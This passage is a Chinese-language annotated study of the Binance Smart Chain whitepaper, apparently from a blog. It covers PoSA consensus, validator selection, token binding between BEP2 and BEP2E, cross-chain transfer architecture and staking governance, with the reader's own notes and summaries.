</li>
</ul>
<h2 id="动机">动机</h2>
<p><code>币安链</code>于2019年4月推出主网后，展示了其<code>高速、高吞吐</code>的设计。<br />
其主要关注点——原生去中心化应用程序（“dApp”）币安链 DEX（去中心化交易所），经受了在短时间内处理数百万交易量的考验，展示了它的交易引擎的低延迟撮合能力。</p>
<p><code>灵活性</code>及<code>可用性</code>往往和<code>性能</code>是熊掌与鱼不能兼得。<br />
当关注点集中在如何提供一个方便的数字资产发行和交易场所上时，这种设计在某种程度上也带来了限制。 社区呼声最高的一直是最希望看到币安链增加可编程扩展功能，或者直白点说，就是 <strong><a href="https://en.wikipedia.org/wiki/Smart_contract">智能合约</a></strong> 和 <strong>虚拟机</strong> 功能。</p>
<p>由于当前<code>币安链</code>的有限功能，数字资产发行者和所有者想要为其资产添加新的去中心化的特性或引入任何形式的社区管理及社区活动时都颇为头痛。<br />
尽管在币安链中添加智能合约功能的期望很高，但这却是个“艰难的决定”。 智能合约的执行可能会减慢DEX的运行速度，并为资产交易添加不确定性因素。即便可以容忍这种妥协，最容易想到的方案可能是基于当前底层的Tendermint共识协议和币安链的主要 RPC接口实现一个虚拟机，但是这种方案会增加现有 dApp 社区的学习成本，不会是一个受欢迎解决方案。</p>
<p>这里我们提出了币安链的<code>并行区块链</code>的概念，以保持原生DEX的高性能，同时友好地支持智能合约功能。</p>
<h2 id="设计原则">设计原则</h2>
<p>在币安链生态系统中构建两个<code>并行区块链</code>之后，两个区块链将各自运行以提供不同的服务。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>新的并行链将被称为<code>币安智能链</code>（以下部分简称为<code>BSC</code>）</p>
</li>
<li class="lvl-2">
<p>而现有的主网仍然称为<code>币安链</code>（以下部分简称为<code>BC</code>）</p>
</li>
</ul>
<p>BSC的设计遵循以下原则：</p>
<ol>
<li class="lvl-3">
<p><strong>独立区块链</strong>： 从技术上讲，BSC 是一个独立的区块链，而不是Layer 2解决方案。 大多数 BSC 的基础技术和业务功能应该是独立的，这样即使BC短时间停止，BSC也可以运行良好。</p>
</li>
<li class="lvl-3">
<p><strong>以太坊兼容</strong>： 第一个实用的、被广泛使用的智能合约平台是以太坊 。为了对接相对成熟的应用和社区，BSC 选择与现有的以太坊主网兼容。 这意味着大多数<strong>dApp</strong>、生态系统组件和工具将与BSC兼容，不需要修改或只需要很小的更改；BSC 节点仅需要类似，或稍高的硬件规范和操作技能就能运作。这一实现应为 BSC 和以太坊未来的版本继续兼容提供空间。</p>
</li>
<li class="lvl-3">
<p><strong>基于权益质押的共识和链上管理的</strong>：基于<code>权益质押（PoS）</code>的共识更环保，给社区治理提供更灵活的选择。可以预期的是，这种共识会比<code>PoW</code>共识有更好的性能，即 <strong>出块时间短，交易处理容量高</strong>。</p>
<blockquote>
<p>注: Tps更高</p>
</blockquote>
</li>
<li class="lvl-3">
<p><strong>原生跨链通信</strong>： BC 和 BSC 都将原生支持两个区块链之间的<code>跨链通信</code>。 <code>通信协议应该是双向的、去中心化的、无需信任第三方的</code>。 它将专注于在 BC 和 BSC 之间转移数字资产，即 <code>BEP2代币</code>，以及后来引入的其他 BEP代币。 该协议应该不会过于关注存储在区块链其他信息，只有少数情况例外。</p>
</li>
</ol>
<h2 id="共识与验证者的人数">共识与验证者的人数</h2>
<p>基于以上设计原则，<code>BSC的共识协议</code>是为了实现以下目标：</p>
<ol>
<li class="lvl-3">
<p>出块时间应该比以太坊时间短，例如 5 秒甚至更短。</p>
</li>
<li class="lvl-3">
<p>只需要等待有限的时间就能最终确认交易，例如大约 1 分钟或更短。</p>
</li>
<li class="lvl-3">
<p><strong>没有通货膨胀</strong> ，区块链的收益来自手续费，手续费以BNB的形式支付。</p>
<blockquote>
<p>注: 有maxSupply,有硬顶,只可能会通缩,不会膨胀</p>
</blockquote>
</li>
<li class="lvl-3">
<p>尽可能与以太坊兼容。</p>
<blockquote>
<p>注: 属于类EVM的公链</p>
</blockquote>
</li>
<li class="lvl-3">
<p>配备了基于<code>权益质押的链上治理机制</code>。</p>
</li>
</ol>
<h3 id="基于权益的权威证明-Proof-Of-Staked-Authority">基于权益的权威证明 (Proof Of Staked Authority)</h3>
<p>尽管<code>工作量证明（PoW）</code>已被证明为实现去中心化网络的实用方案，但它对环境并不友好，而且还需要大量参与者来维护网络安全。<br />
以太坊及一些其他网络，如 MATIC Bor、TOMOChain、GoChain、xDAI在不同的场景中使用<code>权威证明（PoA）</code>或其变体，包括测试网络和主网。</p>
<p>PoA 为 51%的攻击提供了防御，更有效的防止一部分拜占庭节点作恶。 选用PoA作为底层共识是理想的选项之一。<br />
同时，PoA 协议因不如PoW去中心化而被批评，因为<code>验证人</code>，即<code>轮流生成块的节点</code>，拥有极大的权力，并且容易产生腐败和遭受安全攻击。<br />
其他区块链, 如EOS, 引入了不同类型的<code>委托权益证明（DPoS）</code>，允许<strong>代币持有者投票选举验证人节点</strong>。 它让网络更加去中心化，有利于社区管理。</p>
<p>受以上启发，BSC 将 <code>DPoS</code> 和 <code>PoA</code> 结合以达成共识，采用的方案为：</p>
<ol>
<li class="lvl-3">
<p>区块是由<strong>有限数量</strong>的验证人生成的</p>
</li>
</ol>
<blockquote>
<p>Proof Of Staked Authority(POSA)的A为权威的意思,可理解成超级节点</p>
</blockquote>
<ol start="2">
<li class="lvl-3">
<p>验证人轮流以 PoA 方式生成区块，类似于以太坊的<code>Clique共识引擎</code></p>
</li>
<li class="lvl-3">
<p><code>验证人集合</code>是基于权益质押的链上治理<strong>选出和淘汰</strong></p>
</li>
</ol>
<blockquote>
<p>小结: 相当于解答了以下几个问题:</p>
<ul class="lvl-1">
<li class="lvl-2">pow方案?优缺点? more Decentralized</li>
<li class="lvl-2">poA方案?优缺点? 环境友好,作恶成本应为&gt;66%</li>
<li class="lvl-2">为什么最终选用POSA方案?POSA方案的简介?</li>
</ul>
</blockquote>
<h3 id="验证人节点法定人数">验证人节点法定人数</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>在网络启动的创世块阶段，一些受信任的节点将作为<code>初始验证人集合</code>运行。</p>
</li>
<li class="lvl-2">
<p>开始出块后，任何人都可以作为候选人参与竞选验证人。</p>
</li>
<li class="lvl-2">
<p>权益质押状态决定<code>前21个</code>权益质押最多的节点成为下一个验证人集合，这样的选举和淘汰每 24 小时进行一次。</p>
</li>
</ul>
<p><strong>BNB 是BSC权益质押的通证。</strong></p>
<p>为了保持与以太坊共识协议（包括即将到来的升级）的兼容性，BSC 选择依赖BC 进行<code>权益质押管理</code>（请参阅下面的“权益质押与管理”部分）。<br />
在 BC上有一个专用于BSC权益质押的模块。 它将接受BNB 持有者的BSC权益质押，并计算出权益质押最多节点集。</p>
<blockquote>
<p>注:划重点,需要重点了解这块源码,搞清楚bsc权益质押管理的实现。</p>
</blockquote>
<p>每次UTC 零时，BC 都会发出一条可校验的 <strong>“ValidatorSetUpdate”</strong> 跨链消息，通知 BSC 更新其验证人集合。<br />
在生成新的区块前，现有的BSC验证人定期检查是否有 <strong>“ValidatorSetUpdate”</strong> 消息转发到BSC 。<br />
如果有，它们将在一段高度后（即<code>预定义的区块间隔BlockInternal</code>）之后更新验证人集合。</p>
<p>例如，如果 BSC 每5秒生成一个区块且检查周期是 240 个区块，那么当前的验证人集合将在 1200 秒（20 分钟）内检查并更新下一周期的验证人集。</p>
<blockquote>
<p>注: 区块间隔 * 出块时间 = 验证人集合更新时间<br />
注: 预定义的区块间隔可以在配置文件里修改</p>
</blockquote>
<blockquote>
<p>小结: 相当于解答了以下几个问题:</p>
<ul class="lvl-1">
<li class="lvl-2">用什么代币质押参与共识?  BNB</li>
<li class="lvl-2">权益质押管理模块在bc还是在bsc上? bc</li>
<li class="lvl-2">验证者集合的创建和更新机制?
<ul class="lvl-3">
<li class="lvl-4">验证者集合的数量?最大值? 21,authority权威/超级节点</li>
<li class="lvl-4">初始验证人集合在哪设置? bsc的Genesis Contract</li>
<li class="lvl-4">验证人集合更新的时间? 每天utc为0时</li>
<li class="lvl-4">跨链更新的机制? 基于bsc-relayer中继器去同步两个异构链的数据</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="安全与最终性">安全与最终性</h3>
<p>考虑到有超过一半的 <code>½\*N+1</code> 验证人是诚实可信的，基于 PoA 的网络通常可以安全、正常地工作。 然而在某些情况下，拜占庭验证人仍然可能设法攻击网络， 比如通过“克隆攻击”的方式。 为了保证具BSC有与BC一样高的安全性，我们鼓励BSC 用户等待到接收的区块被超过<code>⅔\*N+1 </code>不同的验证人所确认。<br />
通过这种方式，BSC 可以实现与 BC 相似的安全级别，可以容忍少于<code>1/3 \*N</code> 的拜占庭验证人。</p>
<p>对于 21 个验证人，如果区块时间为 5 秒，那么<code>⅔\* N + 1</code> 个不同的验证人确认将需要（2/3*21 + 1）*5 =75秒的时间。<br />
BSC 的任何重要应用程序可能都必须等待<code>⅔*N + 1</code>，以确保相对安全的最终结果。</p>
<p>然而，除了这样的安排，BSC 还引入了<code>惩罚机制</code>来惩罚拜占庭验证人的双重签名或不稳定性，这将在后面的“权益质押和管理”部分中做出介绍。 这种惩罚机制将在很短的时间内暴露恶意验证人，并使 “克隆攻击”非常难以执行或即使执行了也非常不划算。 通过这种惩罚机制，<code>½\*N + 1</code> 甚至更少的区块就足够满足大部分交易最终性了。</p>
<blockquote>
<p>注: 验证人的双重签名(主动作恶)或不稳定性(被动作恶)</p>
</blockquote>
<h3 id="收益">收益</h3>
<p>当前验证者集合中的所有 <code>BSC验证者</code>都将从<code>以BNB支付的手续费</code>中获得收益。<br />
由于 BNB 不是一个会通胀的通证，因此不会像比特币和以太坊网络那样产生挖矿收益，<strong>手续费是验证者的主要收益</strong>。<br />
由于BNB 也是其他应用的实用型通证，委托人和验证人仍将获得持有BNB的其他好处。</p>
<blockquote>
<p>注: BNB不会像btc和eth那样在产生区块时,mint出新的btc/eth来,即不会通胀</p>
<ul class="lvl-1">
<li class="lvl-2">eth节点主要收益: 出块时mint出新的eth + 交易手续费</li>
<li class="lvl-2">bnb节点主要收益: 交易手续费</li>
</ul>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>验证者</code>的收益是从<strong>每个区块的交易中收取的手续费</strong>获得的。</p>
</li>
<li class="lvl-2">
<p><code>验证者</code>可以决定向<code>质押了BNB的委托人</code>分享多少收益，以吸引更多的质押投资。</p>
</li>
<li class="lvl-2">
<p>每个<code>验证者</code>将以<strong>相同的概率轮流生成区块</strong>（如果它们保持 100%在线）。</p>
</li>
</ul>
<p>因此，从长远来看，<strong>所有稳定的验证者都可能获得类似规模的收益</strong>。</p>
<p>同时，每个验证人的质押资产大小可能是不同的，因此，这带来了一种与直觉相反的情况，即更多的用户信任并委托质押于同一个验证人，他们可能获得更少收益。因此，只要验证者仍然是可信的（不受信任的验证人可能带来极大的风险），理性的委托人就会倾向于委派抵押数量较低的验证者。 最终，所有验证人的区别都会更小。这实际上将防止其他网络上出现的质押集中和“赢家永远赢”的问题。</p>
<blockquote>
<p>注: 有21个验证者节点可以委托,假设验证者节点给委托人设置奖励的百分比都相同,那散户不会都投到同一个超级节点,而是会尽可能分散。因为21个验证者节点获取的收益都差不多,如果委托人多了,那每个人平分出来的奖励就少了(apr↓)，所以散户/委托人的委托质押行为,会因实际收益而变得尽可能分散。</p>
</blockquote>
<p>手续费的一部分也将奖励给跨链通信的中继器。 请参考下面的“中继器”部分。</p>
<blockquote>
<p>小结: 相当于解答了以下几个问题:</p>
<ul class="lvl-1">
<li class="lvl-2">验证者的收益来源?</li>
<li class="lvl-2">委托质押会变得集中么?散户/委托人的委托质押行为?</li>
</ul>
<p>注: 验证者要设置一个合理的分享百分比,以吸引更多的散户来委托质押,巩固其前21的地位。最终验证者的分享百分比会差不多,设置成一个收益/吸纳质押的平衡值。<br />
注: bsc链上的交易要多,要卷，最理想的是,每个区块都满交易数量，gas竞争得高,那验证者才能通过手续费获取更多收益，要有赚钱效应。然后验证者竞争会更激烈，促使他们购买/质押更多的BNB,变向完成锁仓。<br />
Q: 在哪能看到验证者的质押变化数据呢? 其一 <a href="https://bscscan.com/chart/validatorreward?validator=0x70f657164e5b75689b64b7fd1fa275f334f28e18">Validator Daily Reward Chart for BscScan</a>,把这数据和bnb的k线结合在一起?</p>
</blockquote>
<h2 id="代币经济学">代币经济学</h2>
<p>BNB 和 BEP2代币可以在BC和BSC上同时流通。由此定义了：</p>
<ol>
<li class="lvl-3">
<p>同一代币可以在两个网络上流通，并且通过跨链通信机制双向地在它们之间流通。</p>
</li>
<li class="lvl-3">
<p>同一代币的总发行量由两个网络共同决定，即代币的总有效供应量应该是代币在BSC和BC上的发行量的总和。</p>
</li>
<li class="lvl-3">
<p>代币可以最初在BSC上创建，格式类似于 ERC20，然后在BC上创建为BEP2，相反的顺序创建也可以。 在这两个网络上都有原生方式来连接这两个网络，并确保代币的总发行量一致。</p>
</li>
</ol>
<h3 id="原生代币">原生代币</h3>
<p>BNB在BSC上运行的方式与ETH 在 以太坊 上运行的方式相同，因此它是BSC和 BC的“原生代币”。这意味着BNB 除了可以在币安链和币安 DEX上被用来支付大部分手续费用之外，BNB 也将用于：</p>
<p>1.支付在 BSC上部署智能合约的手续费<br />
2.对选定的 BSC 验证人进行权益质押，并获得相应的奖励<br />
3.执行跨链操作，例如跨 BC 和 BSC 转账代币资产</p>
<p><strong>启动基金</strong></p>
<p>在启动阶段，<strong>一定量的BNB将在 BC上销毁，然后转移到 BSC 上</strong>。 这个数额被称为 “启动基金”，它将被记录在BSC的第一个区块中，它将被转移到<code>初始 BC-to-BSC 中继器账户</code>（在后面的章节中描述）和<code>初始验证人集合账户</code>上。这些BNB 用于在早期阶段支付交易费用，通过跨链机制将更多的 BNB 从BC 转移到BSC 。</p>
<p>BNB 跨链转账将在后面的小节中讨论，但对于BC到BSC转账，通常是将 BC上的 BNB 从转账的源地址锁定到一个系统控制的地址，并将相应数量的 BNB 从特殊合约解锁到 BSC 上转账的目标地址，或者相反，当从 BSC 转换到BC 时，是将BNB 从BSC 上的源地址锁定到一个特殊合约中，并将 BC 上的锁定的BNB从系统地址释放到目标地址。这种逻辑由 BC 上的代码和 BSC 上的一系列智能合约实现。</p>
<h3 id="其他代币">其他代币</h3>
<p>BC 支持 BEP2代币和即将投入使用的 BEP8 代币，它们是原生资产，可快速交易并确认，可以流通，上币后可以在DEX上交易。 同时，由于 BSC 是 以太坊兼容的，在 BSC 上支持 ERC20合约被称为 “BEP2E”（未来可以通过BEP修改命名，同时也可能支持 BEP8）。BEP2E通过添加更多的方法来“增强”已有协议，这些方法可以公开更多的信息，比如代币单位、精度。代币所有者能够决定跨链代币绑定地址。 BSC 和 BC 共同确保一个代币在不同的用例中的总流通量不变。</p>
<p><strong>代币绑定</strong></p>
<p>BEP2代币将增加一个新的属性用来记录该代币所对应的BSC BEP2E合约（称为“绑定器”），而这个过程被称为“代币绑定”。</p>
<p>代币绑定可以在BEP2 和BEP2E部署好之后的任何时候进行。BEP2或BEP2E的代币所有者在不同的链上使用代币之前，不需要担心绑定。 发行者可以先创建 BEP2，也可以先创建 BEP2E，它们可以在稍后的时间进行绑定。 当然，我们鼓励 BEP2 和 BEP2E 的所有发行者在发行后尽早建立绑定。</p>
<p>绑定BEP2 和BEP2E的典型过程如下：</p>
<ol>
<li class="lvl-3">
<p>确保在两条链上的 BEP2 代币和 BEP2E代币具有相同的总供应量。与更典型的ERC20合约 相比，BEP2E必须添加以下有3 种函数：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>symbol()： 获取代币符号</p>
</li>
<li class="lvl-2">
<p>decimals()： 获取代币十进制小数位数</p>
</li>
<li class="lvl-2">
<p>getOwner()： 获取绑定合约所有者的地址。这个值应该在     BEP2E合约构造函数中初始化，以便绑定操作可以进一步验证绑定消息是否得到来自     BEP2E的发行者。</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p>确定两个区块链的初始发行量。假设总供应量为<em>S</em>，并且 BC 上的预期初始循环供应量为 <em>K</em>，那么所有者应该将 S-K 个代币锁定到 BC上的系统控制地址。</p>
</li>
<li class="lvl-3">
<p>同样，<em>K</em>个代币被锁定在BSC上的特殊合约中，由一个叫做TokenHub的合约控制绑定相关功能。BEP2E代币的发行者应该将该代币的<em>K</em>个锁定到TokenHub，从而使<em>S- K</em>个<em>代币在BSC上流通。因此，两个区块链之间的总流通量仍然是</em>S*。</p>
</li>
<li class="lvl-3">
<p>BEP2 代币的发行者在BC 上发送绑定交易。经过适当的验证后，一旦交易成功执行：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>它将 <em>S-K</em> 个代币转账到BC 上的系统控制地址。</p>
</li>
<li class="lvl-2">
<p>将创建一个跨链绑定请求包，等待中继传递消息。</p>
</li>
</ul>
<ol start="5">
<li class="lvl-3">
<p>BSC 中继将把跨链绑定请求包中继到 BSC 上的 TokenHub 中，相应的请求和信息将存储在合约中。</p>
</li>
<li class="lvl-3">
<p>合约所有者（且只有该所有者）可以运行TokenHub合约的特殊方法ApproveBind来验证绑定请求，以将其标记为成功状态。它将验证：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>代币未被绑定；</p>
</li>
<li class="lvl-2">
<p>绑定具备正确的代币名称，并具有正确的总供应量和位数信息；</p>
</li>
<li class="lvl-2">
<p>在两个网络上正确完成锁定；</p>
</li>
</ul>
<ol start="7">
<li class="lvl-3">
<p>一旦<code>ApproveBind</code>方法成功，<code>TokenHub</code>将标记这两种代币是绑定的，并且在 BSC 上共享同一总流通量，并且状态将传回 BC。在经过BC的最终确认后，BEP2E合约地址和小数点位数将作为一个新属性写入BEP2代币上，代币就可以双向地在两个区块链之间进行转账。 如果 ApproveBind 失败，则故障事件也将传输回BC 以释放锁定的代币，并且可以在以后重试上述步骤。</p>
</li>
</ol>
<h2 id="跨链转账与通信">跨链转账与通信</h2>
<p>跨链通信是让社区利用<code>双链结构</code>的关键基础架构：</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>用户可以随意在BSC 或BC上创建任何代币化的金融产品和数字资产；</p>
</li>
<li class="lvl-4">
<p>在 BSC上的代币可以在BC上稳定的，高吞吐，极快速和友好的环境中完成程序化交易和资产流通；</p>
</li>
<li class="lvl-4">
<p>用户可以在统一的工具生态系统和用户界面中完成这些操作。</p>
</li>
</ul>
<h3 id="跨链转账">跨链转账</h3>
<p>跨链转账是两个区块链之间通信的关键。 它的逻辑是：</p>
<ol>
<li class="lvl-4">
<p>转出的区块链将把来自源地址持有的金额<strong>锁定</strong>到系统控制的地址/合约中；</p>
</li>
<li class="lvl-4">
<p>转入区块链将解锁系统控制的地址/合约中的金额，并将其转账到目标地址。</p>
</li>
</ol>
<blockquote>
<p>注: 类似跨链桥CrossChain Bridge</p>
</blockquote>
<p><code>跨链转账包消息</code>应允许BSC中继器和BC Oracle中继器<strong>验证</strong>以下信息：</p>
<ol>
<li class="lvl-4">
<p>从源地址中锁定了足够数量的代币资产到源区块链上的系统控制地址/合约中。 这可以在目标区块链上得到证实。</p>
</li>
<li class="lvl-4">
<p>适当的代币资产额从系统控制的地址/合约中释放，并分配到目标区块链上的目标地址中。 如果失败，可以在源区块链上确认，这样锁定的代币就可以被释放回去（可能会扣除费用）。</p>
</li>
<li class="lvl-4">
<p>无论转账是否成功，在此转账操作完成后，两个区块链上代币资产的<strong>流通总量都不会改变</strong>。</p>
</li>
</ol>
<p><img src="https://lh6.googleusercontent.com/LtYjYYoTbtUryye7n-BBBNj29cOMgzZCc1aVRfWnICEsSAMA4PBMH8_MI8jIVsV6DuS2EIvqkcfSX_h5NlC-sO7EFTJDS1Un7XgRCEgqgCLPMy-luTtW5c70-Z72wRBPlLv5xKHL" alt="img" /><br />
跨链通信的体系结构如上图所示。 为了适应两个异构系统，通信处理在每个方向上都是不同的。</p>
<h3 id="BC到BSC架构">BC到BSC架构</h3>
<p>BC 是一个基于 Tendermint 的、具有即时完成确认的区块链。需要至少<code>2/3\* N + 1 </code>总投票权的验证人对每个区块签名。 因此可以通过<code>区块头</code>和<code>Merkle 证明</code>验证来验证区块交易甚至状态值是可行的。<br />
这一设计已经被研究并实现为“轻客户端协议”。它被以太坊社区广泛讨论，也被用于实现Cosmos的跨链通信协议。<br />
从BC到BSC 通信将在通过 BSC <strong>智能合约</strong>实现的<code>链上轻客户端TendermintLightClient.sol</code>中得到验证（其中一些是<code>预编译合约</code>）。</p>
<p>在<code>BC</code>上发生一些交易和状态更改之后，如果一个交易触发跨链通信，则<code>中继器</code>将创建并传递<code>跨链数据包</code>消息，并作为数据提交到 BSC 的<code>轻客户端合约</code>上。</p>
<p><code>轻客户端合约</code>将验证跨链数据包，并在通过验证后执行交易。这类验证是通过下述设计保证：</p>
<ol>
<li class="lvl-3">
<p>BC的区块状态将通过<code>区块头</code>和<code>pre-commits</code>同步到BSC上的轻客户端合约，以获得以下信息：</p>
<ul class="lvl-2">
<li class="lvl-6">验证人签名的 BC 区块和app哈希</li>
<li class="lvl-6">当前验证人集合和验证人集合更新</li>
</ul>
</li>
<li class="lvl-3">
<p>存储于BC区块链状态中的“键-值”对将根据 Merkle 证明和上面的信息进行验证。在确认键-值对准确和可信之后，轻客户端合约将执行与跨链包对应的操作。 BC到BSC的跨链操作可以创建如下数据包：</p>
<ul class="lvl-2">
<li class="lvl-6">绑定：将BEP2代币与 BEP2E绑定</li>
<li class="lvl-6">转账：绑定后进行跨链转账，这意味着BC上的流通将会由于锁定减少，并出现在BSC上的目标地址中，保证总流通量不变</li>
<li class="lvl-6">错误处理：处理 BSC到BC 通信的任何超时/失败事件</li>
<li class="lvl-6">BSC验证人集合更新</li>
</ul>
</li>
</ol>
<p>为了确保没有重复、消息序列正确和超时处理，BC 引入了<code>通道</code>概念来管理跨链通信。<br />
对于中继器，请参考下面的“中继器”部分。</p>
<h3 id="BSC到BC架构">BSC到BC架构</h3>
<p>BSC 使用了<code>PoSA(基于权益质押的权威证明)共识协议</code>，该协议可能会出现分叉，因此要求对更多的区块进行确认。<br />
一个区块只有一个验证人的签名，因此仅依赖一个区块不适合验证来自BSC的数据。<br />
为了充分利用 BC的验证人集合信息，采用了类似于<a href="https://github.com/poanetwork/poa-bridge">桥接</a>或 Oracle 区块链的思路：</p>
<ol>
<li class="lvl-3">
<p>来自BSC的跨链通信请求将作为交易提交并在BSC上执行。交易的执行将发出事件，这类事件可以被观察到，并打包成“Oracle”，发送到BC上。 这种类型的“Oracle”交易包没有区块头哈希和 Merkle 证明，而是直接包含操作的跨链信息，如发送方、接收方和要转账的金额。</p>
</li>
<li class="lvl-3">
<p>为了保证 Oracle 的安全性，BC 的验证人将组建一组<code>Oracle 中继器</code>。 BC 的每个验证人都应独立运作一个 Oracle 中继器。这些Oracle 中继器将使用和BC验证人节点相同的秘钥签名、提交和投票给 BC 的跨链通信包。 任何由超过<code>⅔\*N+1</code>个Oracle中继器 的投票权限签名的交易包，其安全性与由<code>⅔\*N+1</code>相同法定数量的验证人的投票权限签名的区块相同。</p>
</li>
</ol>
<p>通过复用同样的验证人集合， BC 无需实现一个轻客户端，并在 BC 上持续更新区块。<br />
这样的Oracle也有 Oracle ID 和类型，以确保顺序和正确的错误处理。</p>
<h3 id="超时与错误处理">超时与错误处理</h3>
<p>在某些情况下，跨链通信会失败。 例如，由于合约中的一些编码错误，在 BSC 上无法执行中继数据包。 <strong>在这种场景中使用超时和错误处理逻辑。</strong><br />
对于可识别的用户和系统错误或任何预期的异常情况，这两个网络应该自行修复。例如，当 BC 到 BSC的转账失败时，BSC 将发出一个失败事件，Oracle 中继器将在BC 上执行退款；当 BSC 到 BC 的转账失败时，BC 将发出一个退款包给BSC中继器，以便解锁款项。然而，跨链通信的任何步骤都可能发生意外错误或异常。在这种情况下，BSC中继器和Oracle 中继器将发现相应的跨链通道被卡在一个特定的序列中。超时一段时间后，BSC中继器和 Oracle 中继器可以请求“SkipSequence”交易，卡住的序列将被标记为“不可执行”。 将提出相应的警告，社区必须讨论如何处理这种情况，例如通过验证人进行赔付，或者甚至在下一次网络升级期间清理错误锁定的资金。</p>
<h3 id="跨链用户体验">跨链用户体验</h3>
<p>理想情况下，用户希望使用两条平行链的方式与使用一条单链的方式相同。它需要将更多复合交易类型添加到跨链通信中以支持这一点，这将极大地增加复杂性、紧耦合和维护负担。在这里，BC和BSC只实现了基本的操作，以在初始启动时促成价值流动，并将大部分用户体验工作通过客户端实现，如钱包。例如，一个钱包可以让用户将代币直接从BSC发送订单到BC的DEX，以一种安全可靠的方式卖出代币。</p>
<h3 id="跨链合约事件">跨链合约事件</h3>
<p>跨链合约事件（CCCE）是为了允许智能合约直接通过合约代码触发跨链事件而设计的。 这在下列基础上成为可能：</p>
<ol>
<li class="lvl-3">
<p>可以提供标准的系统合约，以服务于一般智能合约可调用的操作；</p>
</li>
<li class="lvl-3">
<p>标准事件可以由标准合约发出；</p>
</li>
<li class="lvl-3">
<p>Oracle 中继器可以捕获标准事件，并触发相应的跨链操作；</p>
</li>
<li class="lvl-3">
<p>可以在 BC 上创建专用的、代码管理的地址，并由 BSC 合约访问，这里它被命名为 “BC的合约地址”（CAoB）。</p>
</li>
</ol>
<p>以下几个典型的标准功能将会被实现：</p>
<p>实现以下标准操作：</p>
<ol>
<li class="lvl-3">
<p>BSC 到BC的转账： 这与普通的 BSC 到 BC 转账一样，都是通过标准合约触发的。 资金可以转账到 BC 上的任何地址，包括转账给原始合约中相应 CAoB 。</p>
</li>
<li class="lvl-3">
<p>BC内转账： 转账的完成被视为为一个特殊的跨链转账，而真正的转账是从 CAoB 到任何其他地址（甚至是另一个 CAoB）。</p>
</li>
<li class="lvl-3">
<p>BC 到BSC 转换： 这是以双通跨链通信的方式实现的。 第一个通道是由 BSC合约触发并传输到 BC 上，然后在第二个通道中，BC 将启动一个正常的 从BC 到 BSC的跨链转账，转账地址为 CAoB 到 BSC上的合约地址。需要特别注意的是，BSC 合约只在第二个通道转账时增加余额，第二个通道转账中的错误处理与正常的 BC 到 BSC 转账相同。</p>
</li>
<li class="lvl-3">
<p>IOC（立即执行或取消）交易： 将资产转移到BC 的主要目的是交易。该事件将指示将CAoB中某一资产交易为另一资产，并转移交易的剩余的目标代币，并将全部结果转账给BSC。BC将通过发送“IOC”订单来处理此类中继事件，如IOC订单发到交易对上，一旦下一次撮合完成，执行结果将被传送回BSC，其可以是一种资产，也可以是两种资产。</p>
</li>
<li class="lvl-3">
<p>拍卖交易：这样的活动将指示BC发出拍卖交易，将CAoB中一定数额的资产尽可能多地转换成另一项资产，并在拍卖结束时将所有成果转回BSC。拍卖功能即将在BC上线。</p>
</li>
</ol>
<p>以下是交易的一些细节：</p>
<p>a. 针对交易，双方都可以有一个（绝对或相对的）价格限制；<br />
b. 最终结果将以跨链交易包的形式写入 BSC；<br />
c. 跨链通信费用可从转回 BSC 的资产中收取；<br />
d. BSC 合约反映了 CAoB 的余额和未完成的订单。 无论在交易期间发生什么错误，最终状态都将被传输回原始合约并清算其内部状态。</p>
<p>在上述特点的基础上，将具有高流动性的跨链转账和交易功能非常方便地添加到 BSC 的所有智能合约中。 它将极大地增加在智能合约 和 dApps 上的应用场景，使币安双链产生1+1&gt;2的聚合效应。</p>
<h2 id="权益质押与链上治理">权益质押与链上治理</h2>
<p>PoSA实现了去中心化式的社区治理。 你可以从其他网络中看到类似的想法，特别是 Cosmos 和 EOS 。 其核心逻辑可概括如下。</p>
<ol>
<li class="lvl-3">
<p>代币持有者，包括验证人，可以将他们的代币 “锁定”到权益质押中。 代币持有者可以将他们的代币<strong>委托</strong>给任何验证人或一个验证人候选对象。 之后他们还可以重新选择不同的验证人或候选对象来对他们的代币进行委托。</p>
</li>
<li class="lvl-3">
<p>所有验证人候选对象都将按其获得委托代币的数量进行排序，排名前列的将成为真正的验证人。</p>
</li>
<li class="lvl-3">
<p>验证人可以与它们的委托人共享区块收益。</p>
</li>
<li class="lvl-3">
<p>验证人可能会遭受 <strong>罚息</strong> ，即对他们的不良行为的惩罚，如双重签名或不稳定性。 这样的损失也会与他们的委托人共同分担。</p>
</li>
<li class="lvl-3">
<p>验证人和委托人有一个<code>解除绑定期</code>。当发现恶意拜占庭行为时，代币仍然在一定时间内保持锁定，作恶人将被及时惩罚。</p>
</li>
</ol>
<h3 id="BC权益质押">BC权益质押</h3>
<p>理想情况下，这样的权益质押和奖励发放逻辑应该包含在区块链中，并在产生新区块时自动执行。与币安链一样采用Tendermint共识库的Cosmos Hub就是这样工作的。</p>
<p>自设计之日起，BC就一直在准备启用PoS。另一方面，BSC想要尽可能地与以太坊保持兼容，在其上直接实现PoSA是一个巨大的挑战和压力。特别是考虑到以太坊本身可能在短时间（或更长时间）内迁移到PoS共识协议时，尤其如此。为了保持以太坊的兼容性和复用BC的基础架构，我们在BC上完成了BSC的<code>权益质押逻辑</code>：</p>
<ol>
<li class="lvl-3">
<p>质押代币是 BNB，这是因为它是两个区块链上的原生代币。</p>
</li>
<li class="lvl-3">
<p>在BC上记录BSC的权益质押和委托行为。</p>
</li>
<li class="lvl-3">
<p>BSC 验证人集由它的权益质押和委托逻辑来决定，在BC上构建一个BSC的权益质押模块，并通过跨链通信在每天UTC 00:00:00 由BC传送到 BSC 。</p>
</li>
<li class="lvl-3">
<p>BC上的奖励分配发生在每天UTC 00:00时刻。</p>
</li>
</ol>
<h3 id="奖励">奖励</h3>
<p>验证人集更新和奖励分配都发生在每天 的UTC 00:00 。这是为了节省频繁更新和区块奖励分配的成本。频繁分配奖励的代价可能是巨大的，因为区块奖励是在BSC上收取的，并在BC上分发给BSC验证人和委托人。（请注意，BC出块奖励仅分发给BC验证人。）</p>
<p>为了确保分配是公平的，这里引入了一种延后分配的算法：</p>
<ol>
<li class="lvl-3">
